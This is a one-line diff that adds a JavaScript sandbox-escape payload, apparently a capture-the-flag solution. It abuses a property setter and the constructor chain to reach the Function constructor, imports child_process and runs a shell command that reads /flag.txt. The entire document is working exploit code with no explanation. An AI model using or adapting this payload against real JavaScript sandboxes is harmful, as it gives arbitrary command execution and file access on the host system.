@@ -1,0 +1,1 @@
+let obj = {};Object.defineProperty(obj, 'result', {set(v){console.log(Object.getOwnPropertyDescriptors(v.constructor.constructor('return import("child_process").then(a=>console.log(a.execSync("cat /flag.txt").toString()))')()));return true},get(){return true}});obj
